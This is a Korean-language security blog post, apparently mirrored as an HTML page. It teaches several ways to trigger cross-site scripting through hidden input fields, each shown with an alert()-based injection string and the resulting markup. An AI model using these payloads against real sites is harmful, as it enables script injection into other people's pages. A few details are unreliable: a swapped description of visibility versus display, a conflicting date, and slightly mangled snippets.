@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>HIDDEN:XSS - input type=hidden 에서의 XSS | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="HIDDEN:XSS - input type=hidden 에서의 XSS">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/web-hacking-hiddenxss-xss-in-hidden/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HIDDEN:XSS - input type=hidden 에서의 XSS">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/web-hacking-hiddenxss-xss-in-hidden/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"HIDDEN:XSS - input type=hidden 에서의 XSS","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/web-hacking-hiddenxss-xss-in-hidden/","datePublished":"2016-06-20T00:00:00+00:00","dateModified":"2024-07-29T00:00:00+00:00","image":"https://user-images.githubusercontent.com/13212227/156620100-14bf240a-c7c8-4142-86f0-1b971bc2f74c.jpg"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/"},{"@type":"ListItem","position":5,"name":"HIDDEN:XSS - input type=hidden 에서의 XSS"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">HIDDEN:XSS - input type=hidden 에서의 XSS</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2016-06-20">
+                        JUNE 20, 2016
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>웹 취약점 진단에서 가장 만만하면서 가장 어려울때도 있는 XSS에 대한 이야기를 할까합니다. 그 중에서도 오늘은 hidden XSS. 즉 hidden 속성을 가진 태그에 대한 xss입니다.</p>
+<p>앞서 간단하게 hidden 속성, 왜 hidden이 우회하기 힘든지 설명하고 각각 우회 방법에 대해 이야기해보죠. 읽으시기 전에 편한 이해를 위하여 각 우회 케이스에서 사용할 단어부터 정리하고 시작하겠습니다.</p>
+<ul>
+<li>제약조건: 우회하기 위해 필요한 조건</li>
+<li>query: 공격(Attack) Query</li>
+<li>output: 결과
+<ul>
+<li>원문: 사용자 입력 구간이 들어가는 곳(Default code)
+<ul>
+<li>[USER INJECT] -&gt; 공격 포인트(Attack point)</li>
+</ul>
+</li>
+<li>공격: qeury 입력으로 발생한 결과(공격으로 인한 output)</li>
+</ul>
+</li>
+</ul>
+<h2 id="tldr">TL;DR</h2>
+<pre><code class="language-html hljs">+ 제약조건: 사용자가 XSS를 트리거해야함. (key input)
++ query: hwul&quot; accesskey=&quot;X&quot; onclick=&quot;alert(45)&quot; a=&quot;
++ output
+  원문: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[USER INJECT]&quot;</span><span class="hljs-punctuation">&gt;</span>
+  공격: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hwul&quot;</span> <span class="hljs-attr">accesskey</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;X&quot;</span> <span class="hljs-attr">onclick</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span> <span class="hljs-attr">a</span><span class="hljs-operator">=</span><span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>그리고 트리거를 위한 Key binding</p>
+<p>or</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">button</span> <span class="hljs-attr">popovertarget</span><span class="hljs-operator">=</span><span class="hljs-string">×</span><span class="hljs-punctuation">&gt;</span>Click me<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">button</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;y&quot;</span> <span class="hljs-attr">popover</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">x</span> <span class="hljs-attr">onbeforetoggle</span><span class="hljs-operator">=</span><span class="hljs-string">alert</span> (<span class="hljs-attr">1</span>)<span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h2 id="typehidden">Type=hidden</h2>
+<p>웹은 각각의 태그와 속성으로 이루어져서 사용자에게 알아보기 좋은 웹 UI를 제공해줍니다. 브라우저가 HTML을 해석하는 과정에서 hidden type을 만나게 되면 페이지에 노출하지 않게 됩니다.</p>
+<p>참고로 element를 숨길 수 있는 <code>type=hidden</code>, <code>visibility: hidden</code> 그리고 <code>display: none</code>은 둘 다 페이지 내 요소를 보이지 않게 하기 위한 속성이지만 약간의 차이가 있습니다.</p>
+<ul>
+<li><code>type='hidden'</code>: 렌더링 시 element가 보이지 않게 함</li>
+<li><code>style='visibility: hidden'</code>: 렌더링 시 element가 보이지 않게 함.</li>
+<li><code>style='display: none'</code>: 렌더링 시 element를 보이지 않게 함. 단 position과 size는 유지</li>
+</ul>
+<p>element가 유지되기 때문에 hidden으로 감춘 element는 화면상에 존재하고, 조건에 맞는 경우 XSS를 트리거할 수 있습니다.</p>
+<blockquote>
+<p>하나 예시로 display: none 하위의 XSS 코드는 none 영역을 탈출하지 않는 이상 정상적인 구문으로도 트리거되지 않습니다.
+(e.g <code>&lt;div style=&quot;display:none&quot;&gt;&lt;script&gt;alert(45)&lt;/script&gt;&lt;/div&gt;</code>)</p>
+</blockquote>
+<p>어쩄던 style를 통제하는건 style 속성이나 class를 통해 visibility, display를 각각 보이도록 설정하는 형태로 풀 수 있지만 type hidden의 경우 이러한 방법으로는 어렵습니다. 그래서 오늘 이 글에선 type hidden에 대한 우회 방법을 이야기합니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-comment">&lt;!--</span><span class="hljs-comment"> 혹시나 궁금하실까봐 style에 대한 부분을 넣어보면 </span><span class="hljs-comment">--&gt;</span>
+<span class="hljs-comment">&lt;!--</span><span class="hljs-comment"> display:block !important 와 같이 important를 넣어 덮으면 됩니다. </span><span class="hljs-comment">--&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[USER INJECT]&quot;</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;display:none&quot;</span> <span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onmouseover</span><span class="hljs-operator">=</span><span class="hljs-string">alert(45)</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;display:block !important;&quot;</span> <span class="hljs-attr">a</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;display:none&quot;</span> <span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h2 id="hidden-type-xss">Hidden type XSS</h2>
+<h3 id="escape-tag">Escape tag</h3>
+<p>일반적인 XSS 방법으로 quote('), double qoute(&quot;)를 통해 hidden element 밖으로 나가 새로운 element를 만드는 방법입니다.</p>
+<pre><code class="language-html hljs">+ 제약조건: 특수문자 우회(&quot; &#39; &lt; &gt;)
++ query: &quot;&gt;<span class="hljs-punctuation">&lt;</span><span class="hljs-name">img</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;z&quot;</span> <span class="hljs-attr">onerror</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span><span class="hljs-punctuation">&gt;</span>
++ output
+  원문: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[USER INJECT]&quot;</span><span class="hljs-punctuation">&gt;</span>
+  공격: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-name">img</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;z&quot;</span> <span class="hljs-attr">onerror</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span><span class="hljs-punctuation">&gt;</span>&quot;&gt;
+</code></pre>
+<p><img loading="lazy" src="https://4.bp.blogspot.com/-5NzMr4wjAR8/V2f8i1a2D9I/AAAAAAAABhI/C6cN5yNNGosLasF5xMnSYytGQtKRMFl5gCLcB/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_073.png" alt="" /></p>
+<h3 id="tampering-type-attribute">Tampering type attribute</h3>
+<p>이 방법은 사용자 입력이 type 속성보다 앞이 있을 때 가능합니다. 원래 선언된 type보다 먼저 type을 선언하여 해당 element가 다른 type을 가지도록 변경합니다.</p>
+<pre><code class="language-html hljs">+ 제약조건: user input이 type 속성보다 앞에 선언되어야 함 / 특수문자 우회(&quot; or &#39;)
++ query: &quot; type=&quot;text&quot; onfocus=&quot;alert(45)&quot; autofocus a=&quot;
++ output
+  원문: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[USER INJECT]&quot;</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span><span class="hljs-punctuation">&gt;</span>
+  공격: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">onfocus</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">a</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>보통 input 등에서 id, type 선언은 가장 앞쪽으로 권고됩니다. 다만 때때로 사용자 입력이 앞에 위치하고, attribute를 탈출할 수 있는 경우 id나 type을 선언하여 우회하거나 다른 보안 이슈를 만들어낼 수 있습니다.</p>
+<p><img loading="lazy" src="https://2.bp.blogspot.com/-ivpossFQ1_Y/V2f8oYf26lI/AAAAAAAABhQ/D3yp3QANdBUAhWVJuxGG6h8MnG46gxHXQCLcB/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_069.png" alt="" /></p>
+<h3 id="displayblock으로-태그를-강제로-끌어내기">display:block으로 태그를 강제로 끌어내기</h3>
+<p>세번째 방법은 구버전의 IE(6,7,8)과 Firefox 구버전에서 가능한 방법입니다. 아직 아주 구버전의 소프트웨어를 사용하는 사용자가 존재하기 때문에 같이 언급하면 좋을 것 같아 작성하였습니다.</p>
+<pre><code class="language-html hljs">+ 제약조건: 패치 이전 브라우저(IE6/7/8, firefox 구버전) , 특수문자 우회(&#39; or &quot;)
++ query: &quot; onmouseover=&quot;alert(45)&quot; style=&quot;display:block;width:100%;height:1000px;&quot; a=&quot;
++ output
+  원문: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[USER INJECT]&quot;</span><span class="hljs-punctuation">&gt;</span>
+  공격: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onmouseover</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;display:block;width:100%;height:1000px;&quot;</span> <span class="hljs-attr">a</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>예전에 가능했던 방법이며 현재는 대부분의 브라우저에서 style보다 type=hidden이 우선되기 때문에 영향력이 없습니다.</p>
+<h3 id="accesskey-onclick">accesskey + onclick</h3>
+<p>accesskey 라는 속성을 이용하면 type=hidden 상태에서도 click 이벤트 핸들러를 동작시킬 수 있습니다. 다만 키 입력 조건이 필요하니 아래 OS 별 입력 조건을 확인해주세요.</p>
+<pre><code class="language-html hljs">+ 제약조건: 사용자가 XSS를 트리거해야함. (key input)
++ query: hwul&quot; accesskey=&quot;X&quot; onclick=&quot;alert(45)&quot; a=&quot;
++ output
+  원문: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;[USER INJECT]&quot;</span><span class="hljs-punctuation">&gt;</span>
+  공격: <span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;xsstest&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hwul&quot;</span> <span class="hljs-attr">accesskey</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;X&quot;</span> <span class="hljs-attr">onclick</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(45)&quot;</span> <span class="hljs-attr">a</span><span class="hljs-operator">=</span><span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p><img loading="lazy" src="https://2.bp.blogspot.com/-mY_x9H4nd-0/V2f8vtbQ_kI/AAAAAAAABhY/L4VZQCDAprIepcY1ltVfnzmF_89LXorbgCLcB/s1600/%25EC%2584%25A0%25ED%2583%259D+%25EC%2598%2581%25EC%2597%25AD_070.png" alt="" /></p>
+<h4 id="key-binding">Key Binding</h4>
+<table>
+<thead>
+<tr>
+<th>Browser</th>
+<th>Windows</th>
+<th>Linux</th>
+<th>Mac</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Firefox</td>
+<td><code>Alt + Shift + key</code></td>
+<td></td>
+<td><code>Control + Option + key</code> or <code>Control + Alt + key</code></td>
+</tr>
+<tr>
+<td>Internet Explorer</td>
+<td><code>Alt + key</code> <code>Alt + Shift+ key</code></td>
+<td>없음</td>
+<td></td>
+</tr>
+<tr>
+<td>Edge</td>
+<td></td>
+<td>없음</td>
+<td><code>Control + Option + key</code> or <code>Control + Option + Shift + key</code></td>
+</tr>
+<tr>
+<td>Google Chrome</td>
+<td></td>
+<td><code>Alt + Shift+ key</code></td>
+<td></td>
+</tr>
+<tr>
+<td>Safari</td>
+<td>없음</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Opera 15+</td>
+<td><code>Alt + key</code></td>
+<td></td>
+<td><code>Control + Alt + key</code></td>
+</tr>
+<tr>
+<td>Opera 12</td>
+<td>Shift + Esc를 통해 접근 가능한 단축키 목록을 열고, 그 중에서 key를 눌러 선택합니다.</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>사용자에게 입력을 유도할 수 있다면 좋은 우회방법이겠지요.</p>
+<h3 id="using-onbeforetoggle">Using onbeforetoggle</h3>
+<p>onbeforetoggle eventhandler로도 hideen type에서의 XSS를 진행할 수 있습니다. 관련 내용은 <a href="https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags?pk_source=portswiggerres&amp;pk_medium=social&amp;pk_campaign=psres">PortSwigger의 글</a>에 잘 나와있으니 참고 부탁드려요.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">button</span> <span class="hljs-attr">popovertarget</span><span class="hljs-operator">=</span><span class="hljs-string">×</span><span class="hljs-punctuation">&gt;</span>Click me<span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">button</span><span class="hljs-punctuation">&gt;</span>
+<span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;y&quot;</span> <span class="hljs-attr">popover</span> <span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-string">x</span> <span class="hljs-attr">onbeforetoggle</span><span class="hljs-operator">=</span><span class="hljs-string">alert(1)</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<h3 id="using-oncontentvisibilityautostatechange">Using oncontentvisibilityautostatechange</h3>
+<p>2024년 7월에 새로 추가된 벡터입니다. oncontentvisibilityautostatechange 를 통해 트리거 시 Chrome 브라우저에서 사용자 interaction 없이 XSS 동작이 가능합니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">input</span> <span class="hljs-attr">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">oncontentvisibilityautostatechange</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(/ChromeCanary/)&quot;</span> <span class="hljs-attr">style</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;content-visibility:auto&quot;</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<p>자세한 내용은 <a href="/2024/07/29/hidden-xss-no-user-interaction/">Hidden XSS? No User Interaction!</a> 글을 참고해주세요.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>앞에 3가지 방법은 hidden을 우회하기 위해서 많이 찾아보셨을 것 같습니다. 4번은 트리거 조건은 약간 있지만 우회가 가능하고 이것에 대해서 따로 패치도 없었기 때문에 진단/모의해킹 시 나름 유용하게 사용될 수 있을 것 같네요. 그리고 2023년에 추가된 5번 또한 브라우저의 제약은 살짝 있지만, 굉장히 유용하게 쓰일 수 있습니다.</p>
+<p>무엇이던 항상 가까운곳에 해답이 있다고 생각합니다. 찾다보면 자기만의 재미있는 우회 방법이 생겨나지요 :D</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li>https://developer.mozilla.org/ko/docs/Web/HTML/Global_attributes/accesskey</li>
+<li>https://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html</li>
+<li>https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/hidden</li>
+</ul>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 